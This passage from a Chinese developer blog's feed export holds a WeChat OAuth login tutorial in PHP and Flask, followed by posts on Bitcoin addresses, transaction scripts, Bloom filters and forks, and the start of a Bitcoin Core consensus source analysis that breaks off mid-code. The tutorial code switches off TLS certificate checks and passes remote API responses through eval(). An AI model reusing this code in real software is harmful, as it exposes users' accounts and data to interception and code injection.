<p>后端可以通过<strong>重定向</strong>的方式，设置好参数后跳转到该URL。PHP进行重定向跳转代码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// index.php</span></span><br><span class="line"><span class="variable">$url</span> = <span class="string">&quot;https://open.weixin.qq.com/connect/oauth2/authorize?appid=&#123;APPID&#125;&amp;redirect_uri=&#123;REDIRECT_URI&#125;&amp;response_type=code&amp;scope=&#123;SCOPE&#125;&amp;state=&#123;STATE&#125;#wechat_redirect&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">Header</span>(<span class="string">&quot;Location:<span class="subst">$url</span>&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>url中的参数需要用户填写的，至于如何填写请参照<strong>微信文档</strong>中的要求。</p>
<p>注意：</p>
<ul>
<li><p>REDIRECT_URI，回调地址需要进行<strong>URLencode编码</strong>(自行百度)</p>
</li>
<li><p>SCOPE，有两种取值</p>
</li>
</ul>
<h3 id="第二步：通过code请求获取openid和access-token"><a href="#第二步：通过code请求获取openid和access-token" class="headerlink" title="第二步：通过code请求获取openid和access_token"></a>第二步：通过code请求获取openid和access_token</h3><p>此时，一个参数code传到你指定的后端程序入口（redirect_uri），事先写好的后端程序此时开始发挥作用。</p>
<p>接收到code之后，就可以携带该code请求access_token和openid的接口了（也是一个url）。PHP的代码实现如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// main.php</span></span><br><span class="line"><span class="variable">$code</span> = <span class="variable">$_GET</span>[<span class="string">&quot;code&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 第二步：通过code请求获取openid和access_token</span></span><br><span class="line"><span class="variable">$oauth2Url</span> = <span class="string">&quot;https://api.weixin.qq.com/sns/oauth2/access_token?appid=APPID&amp;secret=SECRET&amp;code=code&amp;grant_type=authorization_code&quot;</span>;</span><br><span class="line"><span class="variable">$oauth2</span> = <span class="title function_ invoke__">getJson</span>(<span class="variable">$oauth2Url</span>); <span class="comment">//getJson是自定义的函数</span></span><br><span class="line"><span class="variable">$access_token</span> = <span class="variable">$oauth2</span>[<span class="string">&quot;access_token&quot;</span>];</span><br><span class="line"><span class="variable">$openid</span> = <span class="variable">$oauth2</span>[<span class="string">&#x27;openid&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// php请求接口并将返回数据进行json化的函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getJson</span>(<span class="params"><span class="variable">$url</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_SSL_VERIFYPEER, <span class="literal">FALSE</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_SSL_VERIFYHOST, <span class="literal">FALSE</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">    <span class="variable">$output</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">json_decode</span>(<span class="variable">$output</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>同样的，url中的大写字母也是要开发者填写的，填写要求见开发文档。</p>
<p>若接口调用成功，将返回一个json，json中包含各种属性，其中就有access_token和openid。</p>
<h3 id="第三步：通过openid和access-token请求获取userinfo"><a href="#第三步：通过openid和access-token请求获取userinfo" class="headerlink" title="第三步：通过openid和access_token请求获取userinfo"></a>第三步：通过openid和access_token请求获取userinfo</h3><p>接下来，携带两个参数请求获取userinfo的接口，代码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// main.php</span></span><br><span class="line"><span class="comment">// 第三步：后端通过openid和access_token换取userinfo的json序列化数据</span></span><br><span class="line"><span class="variable">$get_user_info_url</span> = <span class="string">&quot;https://api.weixin.qq.com/sns/userinfo?access_token=<span class="subst">$access_token</span>&amp;openid=<span class="subst">$openid</span>&amp;lang=zh_CN&quot;</span>;</span><br><span class="line"><span class="variable">$userinfo</span> = <span class="title function_ invoke__">getJson</span>(<span class="variable">$get_user_info_url</span>);  <span class="comment">//getJson的函数定义在第二步</span></span><br></pre></td></tr></table></figure>

<p>若调用成功，将返回一个包含用户信息的json序列化。我们只要从该json中提取用户信息的属性即可：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$name</span>=<span class="variable">$userinfo</span>[<span class="string">&quot;nickname&quot;</span>];</span><br><span class="line"><span class="variable">$headimgurl</span>=<span class="variable">$userinfo</span>[<span class="string">&quot;headimgurl&quot;</span>];</span><br></pre></td></tr></table></figure>

<p>拿到用户信息后，我们就可以为所欲为了。</p>
<h2 id="2-python实现"><a href="#2-python实现" class="headerlink" title="2. python实现"></a>2. python实现</h2><p>python代码实现的思路是一样的，只是代码不同，此处用到了flask框架：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, redirect, request, jsonify</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&#x27;127.0.0.1&#x27;</span></span><br><span class="line">PORT = <span class="number">80</span></span><br><span class="line">DEBUG = <span class="literal">True</span> <span class="comment"># 是否调试模式</span></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.debug = DEBUG <span class="comment"># 调试模式不能适用于开发环境，不安全</span></span><br><span class="line"></span><br><span class="line">APPID = <span class="string">&#x27;xxxxxxxx&#x27;</span> <span class="comment"># 公众号ID</span></span><br><span class="line">APPSECRET = <span class="string">&#x27;xxxxxxxxxxxxxxxxx&#x27;</span> <span class="comment"># 公众号密钥</span></span><br><span class="line">REDIRECT_URI = <span class="string">&#x27;http%3A//127.0.0.1/getUserInfo&#x27;</span> <span class="comment"># 回调URL，需要在公众号中配置</span></span><br><span class="line">SCOPE = <span class="string">&#x27;snsapi_userinfo&#x27;</span> <span class="comment"># 弹出授权页面，可通过openid拿到昵称、性别、所在地。并且， 即使在未关注的情况下，只要用户授权，也能获取其信息</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="comment"># 第一步：后端重定位到微信提供的接口URL，让用户同意授权后，微信服务器会跳转到回调地址并携带code参数</span></span><br><span class="line">    source_url = <span class="string">&#x27;https://open.weixin.qq.com/connect/oauth2/authorize&#x27;</span>\</span><br><span class="line">        + <span class="string">&#x27;?appid=&#123;APPID&#125;&amp;redirect_uri=&#123;REDIRECT_URI&#125;&amp;response_type=code&amp;scope=&#123;SCOPE&#125;&#x27;</span>\</span><br><span class="line">        + <span class="string">&#x27;#wechat_redirect&#x27;</span></span><br><span class="line">    url = source_url.<span class="built_in">format</span>(APPID = APPID, REDIRECT_URI = REDIRECT_URI, SCOPE = SCOPE)</span><br><span class="line">    <span class="keyword">return</span> redirect(url) <span class="comment"># 重定向</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 第一步回调URL</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/getUserInfo&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getUserInfo</span>():</span><br><span class="line">    <span class="comment"># 第二步：通过code换取网页授权access_token</span></span><br><span class="line">    code = request.args.get(<span class="string">&#x27;code&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(code)</span><br><span class="line">    source_url = <span class="string">&#x27;https://api.weixin.qq.com/sns/oauth2/access_token?&#x27;</span>\</span><br><span class="line">        +<span class="string">&#x27;appid=&#123;APPID&#125;&amp;secret=&#123;APPSECRET&#125;&amp;code=&#123;CODE&#125;&amp;grant_type=authorization_code&#x27;</span></span><br><span class="line">    access_token_url = source_url.<span class="built_in">format</span>(APPID = APPID, APPSECRET = APPSECRET, CODE = code)</span><br><span class="line">    resp = requests.get(access_token_url)</span><br><span class="line">    data = <span class="built_in">eval</span>(resp.text) <span class="comment"># 将字符串转为字典</span></span><br><span class="line">    <span class="built_in">print</span>(data)</span><br><span class="line">    access_token = data[<span class="string">&#x27;access_token&#x27;</span>]</span><br><span class="line">    openid = data[<span class="string">&#x27;openid&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 第三步：刷新access_token（如果需要）</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 第四步：拉取用户信息(需scope为 snsapi_userinfo)</span></span><br><span class="line">    source_url = <span class="string">&#x27;https://api.weixin.qq.com/sns/userinfo&#x27;</span>\</span><br><span class="line">        + <span class="string">&#x27;?access_token=&#123;ACCESS_TOKEN&#125;&amp;openid=&#123;OPENID&#125;&amp;lang=zh_CN&#x27;</span></span><br><span class="line">    useinfo_url = source_url.<span class="built_in">format</span>(ACCESS_TOKEN = access_token, OPENID = openid)</span><br><span class="line">    resp = requests.get(useinfo_url)</span><br><span class="line">    data = <span class="built_in">eval</span>(resp.text)</span><br><span class="line">    <span class="built_in">print</span>(data)</span><br><span class="line">    userinfo = &#123;</span><br><span class="line">        <span class="string">&#x27;nickname&#x27;</span>: data[<span class="string">&#x27;nickname&#x27;</span>],</span><br><span class="line">        <span class="string">&#x27;sex&#x27;</span>: data[<span class="string">&#x27;sex&#x27;</span>],</span><br><span class="line">        <span class="string">&#x27;province&#x27;</span>: data[<span class="string">&#x27;province&#x27;</span>],</span><br><span class="line">        <span class="string">&#x27;city&#x27;</span>: data[<span class="string">&#x27;city&#x27;</span>],</span><br><span class="line">        <span class="string">&#x27;country&#x27;</span>: data[<span class="string">&#x27;country&#x27;</span>],</span><br><span class="line">        <span class="string">&#x27;headimgurl&#x27;</span>: data[<span class="string">&#x27;headimgurl&#x27;</span>]</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> jsonify(userinfo)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=HOST, port=PORT)</span><br></pre></td></tr></table></figure>

<p>由于此处使用的是微信测试公众号，所以回调地址可以填本地IP。</p>
<h2 id="3-调试"><a href="#3-调试" class="headerlink" title="3. 调试"></a>3. 调试</h2><p>运行apache服务器，或者启动flask。</p>
<p>然后，打开微信开发者工具，选择公众号网页项目。</p>
<p>在地址栏中输入访问后端运行地址(localhost:80)便可，如下图：</p>
<p><img src="/%E5%BE%AE%E4%BF%A1%E7%BD%91%E9%A1%B5%E8%8E%B7%E5%8F%96%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF/2.png" alt="img"></p>
<h2 id="4-结语"><a href="#4-结语" class="headerlink" title="4. 结语"></a>4. 结语</h2><p>本文有任何不足或错误之处，欢迎大家指正批评。</p>
]]></content>
      <categories>
        <category>开发</category>
        <category>后端</category>
      </categories>
      <tags>
        <tag>后端</tag>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>数据结构与算法小汇总</title>
    <url>/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95%E5%B0%8F%E6%B1%87%E6%80%BB.html</url>
    <content><![CDATA[<p>数据结构与算法是计算机人最重要的基础之一，不可不察！因此，特将数据结构与算法知识进行简单总结，详细内容见：<br><a href="https://github.com/99MyCql/DataStructures-and-Algorithms">https://github.com/99MyCql/DataStructures-and-Algorithms</a></p>
]]></content>
      <categories>
        <category>九层之台，起于累土</category>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>数据结构与算法</tag>
      </tags>
  </entry>
  <entry>
    <title>比特币中的重难点</title>
    <url>/%E6%AF%94%E7%89%B9%E5%B8%81%E4%B8%AD%E7%9A%84%E9%87%8D%E9%9A%BE%E7%82%B9.html</url>
    <content><![CDATA[<h2 id="1-比特币地址"><a href="#1-比特币地址" class="headerlink" title="1. 比特币地址"></a>1. 比特币地址</h2><p>比特币地址是资金接收者的地址，相当于收款人的银行账号。它并非直接等于收款人的公钥，而是需要经过一定的转换，转换过程如下：</p>
<span id="more"></span>

<p><img src="/%E6%AF%94%E7%89%B9%E5%B8%81%E4%B8%AD%E7%9A%84%E9%87%8D%E9%9A%BE%E7%82%B9/image_-z1h0XTtD_.png" alt="1"></p>
<p>注意：</p>
<ul>
<li><p>比特币的公钥是由私钥根据<strong>椭圆曲线加密算法</strong>计算出来的，其反向运算是非常困难的，只能通过暴力搜索。</p>
</li>
<li><p>为什么比特币地址要对公钥进行哈希，而不直接使用公钥？因为哈希是不可逆的，比如在SHA256哈希过程中，源数据的部分信息会丢失，不然无法保证任意输入的输出值都为256位。所以我们无法通过比特币地址推导出用户公钥，即使量子计算机也不可以，这就能防止用户公钥泄露（公钥是有可能推出私钥的）。</p>
</li>
</ul>
<h2 id="2-交易脚本"><a href="#2-交易脚本" class="headerlink" title="2. 交易脚本"></a>2. 交易脚本</h2><p>在比特币区块数据中，一笔交易会以如下形式存储：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;version&quot;</span>: <span class="number">1</span>,</span><br><span class="line">  <span class="string">&quot;locktime&quot;</span>: <span class="number">0</span>,</span><br><span class="line">  <span class="string">&quot;vin&quot;</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="string">&quot;txid&quot;</span>:<span class="string">&quot;7957a35fe64f80d234d76d83a2a8f1a0d8149a41d81de548f0a65a8a999f6f18&quot;</span>,</span><br><span class="line">      <span class="string">&quot;vout&quot;</span>: <span class="number">0</span>,</span><br><span class="line">      <span class="string">&quot;scriptSig&quot;</span>: <span class="string">&quot;3045022100884d142d86652a3f47ba4746ec719bbfbd040a570b1deccbb6498c75c4ae24cb02204b9f039ff08df09cbe9f6addac960298cad530a863ea8f53982c09db8f6e3813[ALL] 0484ecc0d46f1918b30928fa0e4ed99f16a0fb4fde0735e7ade8416ab9fe423cc5412336376789d172787ec3457eee41c04f4938de5cc17b4a10fa336a8d752adf&quot;</span>,</span><br><span class="line">      <span class="string">&quot;sequence&quot;</span>: <span class="number">4294967295</span></span><br><span class="line">    &#125;</span><br><span class="line"> ],</span><br><span class="line">  <span class="string">&quot;vout&quot;</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="string">&quot;value&quot;</span>: <span class="number">0.01500000</span>,</span><br><span class="line">      <span class="string">&quot;scriptPubKey&quot;</span>: <span class="string">&quot;OP_DUP OP_HASH160 ab68025513c3dbd2f7b92a94e0581f5d50f654e7 OP_EQUALVERIFY OP_CHECKSIG&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="string">&quot;value&quot;</span>: <span class="number">0.08450000</span>,</span><br><span class="line">      <span class="string">&quot;scriptPubKey&quot;</span>: <span class="string">&quot;OP_DUP OP_HASH160 7f9b1a7fb68d60c536c2fd8aeaa53a8f3cc025a8 OP_EQUALVERIFY OP_CHECKSIG&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在这笔交易中，有1个输入、2个输出。</p>
<p>每个输入的结构如下：</p>
<ul>
<li><p>txid：指向上一笔交易(UTXO)的ID</p>
</li>
<li><p>vout：用于指明使用上一笔交易中的哪个输出</p>
</li>
<li><p><strong>scriptSig：解锁脚本</strong></p>
</li>
<li><p>sequence：序列号，Used for locktime or disabled (0xFFFFFFFF)</p>
</li>
</ul>
<p>每个输出的结构如下：</p>
<ul>
<li><p>value：输出比特币的值</p>
</li>
<li><p><strong>scriptPubKey：锁定脚本</strong></p>
</li>
</ul>
<p>可以看到在一笔交易中，并未直接明了地给出交易双方的地址或公钥等信息，那么如何验证交易的有效性呢？这就不得不提到比特币的交易脚本语言，它是一种基于堆栈的执行语言。<strong>当一笔交易被验证时，交易中每一个输入的解锁脚本，与上一笔交易中对应输出的锁定脚本一起执行，以此验证这笔交易是否有效。</strong></p>
<p>下图是最常见交易(P2PKH, Pay-to-Public-Key-Hash)的解锁脚本（在当前交易的输入中）和锁定脚本（在上一笔交易的输出中）示例：</p>
<p><img src="/%E6%AF%94%E7%89%B9%E5%B8%81%E4%B8%AD%E7%9A%84%E9%87%8D%E9%9A%BE%E7%82%B9/image_fQJ2Tq2fYS.png" alt="1"></p>
<p>其中&lt;sig&gt;是当前交易付款方的签名；&lt;PubK&gt;是当前交易付款方的公钥；&lt;PubKHash&gt;是付款方公钥的哈希，也就是付款方（上一笔交易的收款方）的比特币地址。</p>
<p>脚本组合之后，从左往右执行，执行环境是在一个栈中。当遇到&lt;xxx&gt;时，直接将值压入栈中。DUP是将栈顶值复制一份再压入栈。HASH160是将栈顶值进行HASH160运算，即由公钥得到比特币地址。EQUALVERIFY是验证栈顶两个值是否相等。CHECKSIG是用公钥验证签名是否正确。</p>
<p>注意：</p>
<ul>
<li>交易输入的解锁脚本中会暴露付款方的公钥，为了保护公钥进而保护私钥，用户可以生成多个公钥，交易的找零输出中可以找零到自己的新地址（通常每次交易时，钱包都会生成一个新找零地址）。</li>
</ul>
<h2 id="3-Bloom过滤器"><a href="#3-Bloom过滤器" class="headerlink" title="3. Bloom过滤器"></a>3. Bloom过滤器</h2><p>对于轻节点，通常只保存最近少数几个区块的区块头。当它想知道与它相关的交易是否生效（被写入区块链中）时，它需要委托全节点将与它相关的交易所在的区块头和merkle路径转发过来。<strong>但是，轻节点又不想暴露它的地址</strong>。为了保护轻节点隐私，同时又能让全节点筛选出与轻节点地址相关的交易，比特币使用了布隆(Bloom)过滤器。</p>
<p>布隆过滤器由一个集合生成，当某个元素经过布隆过滤器时，会得出两种结果Yes或No。Yes可以判断出元素<strong>可能存在</strong>集合中，No则能判断出元素<strong>肯定不在</strong>集合中。</p>
<p>布隆过滤器由一个长度为N的bit数组和M个哈希函数组成，数组中每个bit对应的初始值都为0。如下，是一个N&#x3D;16, M&#x3D;3的例子：</p>
<p><img src="/%E6%AF%94%E7%89%B9%E5%B8%81%E4%B8%AD%E7%9A%84%E9%87%8D%E9%9A%BE%E7%82%B9/image_GAt-TwWByO.png" alt="1"></p>
<p>生成布隆过滤器：将集合中每个元素经过三个哈希函数，并将结果映射位置的值置为1。如下图，集合中有三个网址，将它们映射并生成bit数组：</p>
<p><img src="/%E6%AF%94%E7%89%B9%E5%B8%81%E4%B8%AD%E7%9A%84%E9%87%8D%E9%9A%BE%E7%82%B9/image_m_Md3oNUe2.png" alt="1"></p>
<p><img src="/%E6%AF%94%E7%89%B9%E5%B8%81%E4%B8%AD%E7%9A%84%E9%87%8D%E9%9A%BE%E7%82%B9/image_MDJN0Outw_.png" alt="1"></p>
<p><img src="/%E6%AF%94%E7%89%B9%E5%B8%81%E4%B8%AD%E7%9A%84%E9%87%8D%E9%9A%BE%E7%82%B9/image_YLjDhZLG9T.png" alt="1"></p>
<p>根据生成的bit数组，对于一个新元素，若经过三个哈希函数映射位置的值都为1，那能说明该元素可能存在于集合中；若映射位置的值不都为1，那说明该元素一定不在集合中。</p>
<p><img src="/%E6%AF%94%E7%89%B9%E5%B8%81%E4%B8%AD%E7%9A%84%E9%87%8D%E9%9A%BE%E7%82%B9/image_y0fPneDuTT.png" alt="1"></p>
<p><img src="/%E6%AF%94%E7%89%B9%E5%B8%81%E4%B8%AD%E7%9A%84%E9%87%8D%E9%9A%BE%E7%82%B9/image__Xn7BmeYKP.png" alt="1"></p>
<p>根据其性质，布隆过滤器存在误判的可能性，即不能判断一个元素一定在集合中。但随着哈希函数个数和数组长度的增大，误判发生的概率就越小。并且，在某些场景下，不需要准确地判定元素一定存在集合中。</p>
<p>回到一开始的场景，轻节点只需将它的地址混在多个随机地址的集合中，以此生成布隆过滤器。再将此布隆过滤器发送给全节点，全节点会根据布隆过滤器筛选，将符合过滤器的信息返回给轻节点。轻节点再从其中找出真正与自己相关的信息，完成验证。</p>
<h2 id="4-硬分叉-x2F-软分叉"><a href="#4-硬分叉-x2F-软分叉" class="headerlink" title="4. 硬分叉&#x2F;软分叉"></a>4. 硬分叉&#x2F;软分叉</h2><p>硬分叉：旧节点不认可新节点的区块。旧节点和新节点会发生永久性的分叉。</p>
<p>软分叉：旧节点认可新节点的区块。临时性的分叉，随着新节点增多，最终会合并。</p>
<p>举例：区块大小限制原先是1MB，新版本要求2MB，旧节点不认可新节点发布的区块，就会发生硬分叉；新版本若要求0.5MB，旧节点认可新节点发布的区块，是软分叉。</p>
]]></content>
      <categories>
        <category>欲穷千里目，更上一层楼</category>
        <category>区块链</category>
      </categories>
      <tags>
        <tag>区块链</tag>
      </tags>
  </entry>
  <entry>
    <title>比特币共识模块源码分析</title>
    <url>/%E6%AF%94%E7%89%B9%E5%B8%81%E5%85%B1%E8%AF%86%E6%A8%A1%E5%9D%97%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>分析比特币系统的共识模块，包括共识算法、交易的流程等，基于比特币开源客户端<a href="https://github.com/bitcoin/bitcoin">Bitcoin Core</a> <strong>v22.0</strong> 版本的源码。</p>
<span id="more"></span>

<p>比特币中共识算法的大体步骤如下：</p>
<ol>
<li><p>新交易被创建并广播到比特币网络中。</p>
</li>
<li><p>每个节点接收到交易后，独立地对交易进行验证。</p>
</li>
<li><p>矿工节点将新交易收集到一个区块中，并为该区块寻找工作量证明，然后将新区块广播到网络中。</p>
</li>
<li><p>每个节点收到区块后，对区块进行独立的校验，并组装进区块链中。</p>
</li>
<li><p>每个节点对区块链进行独立选择，选择最大工作量证明的链。</p>
</li>
</ol>
<p>接下来，将结合源码讲解分析上述步骤。</p>
<h2 id="创建交易"><a href="#创建交易" class="headerlink" title="创建交易"></a>创建交易</h2><p>在Bitcoin Core客户端中，用户可以通过 <code>$ bitcoin-cli createrawtransaction</code>命令创建一笔交易。这个命令背后对应着一个RPC接口，并映射到一个处理函数。映射关系定义在<code>src\rpc\rawtransaction.cpp</code>中：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 注册交易的RPC接口及其对应的处理函数</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">RegisterRawTransactionRPCCommands</span><span class="params">(CRPCTable &amp;t)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// clang-format off</span></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> CRPCCommand commands[] =</span><br><span class="line">&#123; <span class="comment">//  category               actor (function)</span></span><br><span class="line">  <span class="comment">//  ---------------------  -----------------------</span></span><br><span class="line">    &#123; <span class="string">&quot;rawtransactions&quot;</span>,     &amp;getrawtransaction,          &#125;,</span><br><span class="line">    &#123; <span class="string">&quot;rawtransactions&quot;</span>,     &amp;createrawtransaction,       &#125;,</span><br><span class="line">    &#123; <span class="string">&quot;rawtransactions&quot;</span>,     &amp;decoderawtransaction,       &#125;,</span><br><span class="line">    &#123; <span class="string">&quot;rawtransactions&quot;</span>,     &amp;decodescript,               &#125;,</span><br><span class="line">    &#123; <span class="string">&quot;rawtransactions&quot;</span>,     &amp;sendrawtransaction,         &#125;,</span><br><span class="line">    &#123; <span class="string">&quot;rawtransactions&quot;</span>,     &amp;combinerawtransaction,      &#125;,</span><br><span class="line">    &#123; <span class="string">&quot;rawtransactions&quot;</span>,     &amp;signrawtransactionwithkey,  &#125;,</span><br><span class="line">    &#123; <span class="string">&quot;rawtransactions&quot;</span>,     &amp;testmempoolaccept,          &#125;,</span><br><span class="line">    &#123; <span class="string">&quot;rawtransactions&quot;</span>,     &amp;decodepsbt,                 &#125;,</span><br><span class="line">    &#123; <span class="string">&quot;rawtransactions&quot;</span>,     &amp;combinepsbt,                &#125;,</span><br><span class="line">    &#123; <span class="string">&quot;rawtransactions&quot;</span>,     &amp;finalizepsbt,               &#125;,</span><br><span class="line">    &#123; <span class="string">&quot;rawtransactions&quot;</span>,     &amp;createpsbt,                 &#125;,</span><br><span class="line">    &#123; <span class="string">&quot;rawtransactions&quot;</span>,     &amp;converttopsbt,              &#125;,</span><br><span class="line">    &#123; <span class="string">&quot;rawtransactions&quot;</span>,     &amp;utxoupdatepsbt,             &#125;,</span><br><span class="line">    &#123; <span class="string">&quot;rawtransactions&quot;</span>,     &amp;joinpsbts,                  &#125;,</span><br><span class="line">    &#123; <span class="string">&quot;rawtransactions&quot;</span>,     &amp;analyzepsbt,                &#125;,</span><br><span class="line"></span><br><span class="line">    &#123; <span class="string">&quot;blockchain&quot;</span>,          &amp;gettxoutproof,              &#125;,</span><br><span class="line">    &#123; <span class="string">&quot;blockchain&quot;</span>,          &amp;verifytxoutproof,           &#125;,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// clang-format on</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">const</span> <span class="keyword">auto</span>&amp; c : commands) &#123;</span><br><span class="line">        t.<span class="built_in">appendCommand</span>(c.name, &amp;c);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>该注册函数的被调用关系图如下：</p>
<p><img src="/%E6%AF%94%E7%89%B9%E5%B8%81%E5%85%B1%E8%AF%86%E6%A8%A1%E5%9D%97%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/1.png" alt="1"></p>
<p>创建交易RPC接口对应的处理函数如下：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> RPCHelpMan <span class="title">createrawtransaction</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> RPCHelpMan&#123;<span class="string">&quot;createrawtransaction&quot;</span>,</span><br><span class="line">                <span class="string">&quot;\nCreate a transaction spending the given inputs and creating new outputs.\n&quot;</span></span><br><span class="line">                <span class="string">&quot;Outputs can be addresses or data.\n&quot;</span></span><br><span class="line">                <span class="string">&quot;Returns hex-encoded raw transaction.\n&quot;</span></span><br><span class="line">                <span class="string">&quot;Note that the transaction&#x27;s inputs are not signed, and\n&quot;</span></span><br><span class="line">                <span class="string">&quot;it is not stored in the wallet or transmitted to the network.\n&quot;</span>,</span><br><span class="line">                &#123;</span><br><span class="line">                    &#123;<span class="string">&quot;inputs&quot;</span>, RPCArg::Type::ARR, RPCArg::Optional::NO, <span class="string">&quot;The inputs&quot;</span>,</span><br><span class="line">                        &#123;</span><br><span class="line">                            &#123;<span class="string">&quot;&quot;</span>, RPCArg::Type::OBJ, RPCArg::Optional::OMITTED, <span class="string">&quot;&quot;</span>,</span><br><span class="line">                                &#123;</span><br><span class="line">                                    &#123;<span class="string">&quot;txid&quot;</span>, RPCArg::Type::STR_HEX, RPCArg::Optional::NO, <span class="string">&quot;The transaction id&quot;</span>&#125;,</span><br><span class="line">                                    &#123;<span class="string">&quot;vout&quot;</span>, RPCArg::Type::NUM, RPCArg::Optional::NO, <span class="string">&quot;The output number&quot;</span>&#125;,</span><br><span class="line">                                    &#123;<span class="string">&quot;sequence&quot;</span>, RPCArg::Type::NUM, RPCArg::DefaultHint&#123;<span class="string">&quot;depends on the value of the &#x27;replaceable&#x27; and &#x27;locktime&#x27; arguments&quot;</span>&#125;, <span class="string">&quot;The sequence number&quot;</span>&#125;,</span><br><span class="line">                                &#125;,</span><br><span class="line">                            &#125;,</span><br><span class="line">                        &#125;,</span><br><span class="line">                    &#125;,</span><br><span class="line">                    &#123;<span class="string">&quot;outputs&quot;</span>, RPCArg::Type::ARR, RPCArg::Optional::NO, <span class="string">&quot;The outputs (key-value pairs), where none of the keys are duplicated.\n&quot;</span></span><br><span class="line">                            <span class="string">&quot;That is, each address can only appear once and there can only be one &#x27;data&#x27; object.\n&quot;</span></span><br><span class="line">                            <span class="string">&quot;For compatibility reasons, a dictionary, which holds the key-value pairs directly, is also\n&quot;</span></span><br><span class="line">                            <span class="string">&quot;                             accepted as second parameter.&quot;</span>,</span><br><span class="line">                        &#123;</span><br><span class="line">                            &#123;<span class="string">&quot;&quot;</span>, RPCArg::Type::OBJ_USER_KEYS, RPCArg::Optional::OMITTED, <span class="string">&quot;&quot;</span>,</span><br><span class="line">                                &#123;</span><br><span class="line">                                    &#123;<span class="string">&quot;address&quot;</span>, RPCArg::Type::AMOUNT, RPCArg::Optional::NO, <span class="string">&quot;A key-value pair. The key (string) is the bitcoin address, the value (float or string) is the amount in &quot;</span> + CURRENCY_UNIT&#125;,</span><br><span class="line">                                &#125;,</span><br><span class="line">                                &#125;,</span><br><span class="line">                            &#123;<span class="string">&quot;&quot;</span>, RPCArg::Type::OBJ, RPCArg::Optional::OMITTED, <span class="string">&quot;&quot;</span>,</span><br><span class="line">                                &#123;</span><br><span class="line">                                    &#123;<span class="string">&quot;data&quot;</span>, RPCArg::Type::STR_HEX, RPCArg::Optional::NO, <span class="string">&quot;A key-value pair. The key must be \&quot;data\&quot;, the value is hex-encoded data&quot;</span>&#125;,</span><br><span class="line">                                &#125;,</span><br><span class="line">                                &#125;,</span><br><span class="line">                        &#125;,</span><br><span class="line">                        &#125;,</span><br><span class="line">                    &#123;<span class="string">&quot;locktime&quot;</span>, RPCArg::Type::NUM, RPCArg::Default&#123;<span 